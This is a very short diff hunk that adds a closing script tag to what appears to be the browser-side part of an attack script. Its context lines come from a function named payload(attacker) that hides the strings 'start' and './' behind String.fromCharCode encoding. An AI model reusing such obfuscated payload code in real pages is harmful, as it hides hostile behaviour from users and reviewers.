@@ -146,3 +146,4 @@ function payload(attacker) {
 	record({str_action:String.fromCharCode(115,116,97,114,116)})
 	proxy(String.fromCharCode(46,47));
 }
+</script>
